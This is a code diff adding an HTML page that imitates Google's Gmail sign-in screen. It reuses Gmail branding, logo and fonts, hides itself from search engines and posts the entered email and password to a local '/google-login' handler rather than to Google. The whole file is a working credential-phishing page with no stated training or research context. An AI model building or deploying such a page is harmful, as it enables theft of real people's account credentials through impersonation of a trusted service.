@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Gmail</title>
+    <meta name="description" content="Gmail is email that's intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="shortcut icon" href="//www.google.com/favicon.ico">
+    
+    <style>
+        body {
+            background: #fff;
+            color: rgba(0,0,0,.87);
+            font-family: 'Roboto', sans-serif;
+            font-size: 14px;
+            line-height: 20px;
+            margin: 0;
+            padding: 0;
+        }
+        
+        @font-face {
+            font-family: 'Roboto';
+            font-style: normal;
+            font-weight: 100;
+            src: local('Roboto Thin'), local('Roboto-Thin'), 
+                 url(//fonts.gstatic.com/s/roboto/v15/2tsd397wLxj96qwHyNIkxPesZW2xOQ-xsNqO47m55DA.woff2) format('woff2');
+        }
+        
+        @font-face {
+            font-family: 'Roboto';
+            font-style: normal;
+            font-weight: 300;
+            src: local('Roboto Light'), local('Roboto-Light'), 
+                 url(//fonts.gstatic.com/s/roboto/v15/Hgo13k-tfSpn0qi1SFdUfVtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
+        }
+        
+        @font-face {
+            font-family: 'Roboto';
+            font-style: normal;
+            font-weight: 400;
+            src: local('Roboto Regular'), local('Roboto-Regular'), 
+                 url(//fonts.gstatic.com/s/roboto/v15/CWB0XYA8bzo0kSThX0UTuA.woff2) format('woff2');
+        }
+        
+        @font-face {
+            font-family: 'Roboto';
+            font-style: normal;
+            font-weight: 500;
+            src: local('Roboto Medium'), local('Roboto-Medium'), 
+                 url(//fonts.gstatic.com/s/roboto/v15/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
+        }
+        
+        @font-face {
+            font-family: 'Roboto';
+            font-style: normal;
+            font-weight: 700;
+            src: local('Roboto Bold'), local('Roboto-Bold'), 
+                 url(//fonts.gstatic.com/s/roboto/v15/d-6IYplOFocCacKzxwXSOFtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 32px;
+            margin: 0;
+        }
+        
+        h2 {
+            font-size: 14px;
+            font-weight: 500;
+            line-height: 20px;
+            margin-bottom: 0;
+        }
+        
+        h3 {
+            font-size: 16px;
+            font-weight: 500;
+            line-height: 20px;
+        }
+        
+        a, a:hover, a:visited {
+            color: #4285f4;
+            cursor: pointer;
+            text-decoration: none;
+            outline: none;
+        }
+        
+        .login-container {
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 48px 40px 36px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        
+        .btn {
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            text-align: center;
+            display: inline-block;
+        }
+        
+        .btn:hover {
+            background-color: #3367d6;
+        }
+        
+        .footer-links {
+            margin-top: 40px;
+            font-size: 12px;
+            text-align: center;
+        }
+        
+        .footer-links a {
+            margin: 0 10px;
+            color: #757575;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="//ssl.gstatic.com/images/branding/product/1x/mail_48dp.png" alt="Gmail" width="48" height="48">
+            <h1>Sign in</h1>
+            <p>to continue to Gmail</p>
+        </div>
+        
+        <form action="/google-login" method="post">
+            <div class="form-group">
+                <input type="email" id="email" name="email" placeholder="Email or phone" required>
+            </div>
+            
+            <div class="form-group">
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            
+            <div class="form-group">
+                <button type="submit" class="btn">Next</button>
+            </div>
+        </form>
+        
+        <div class="footer-links">
+            <a href="#">Create account</a>
+            <a href="#">Forgot email?</a>
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+</body>
+</html>
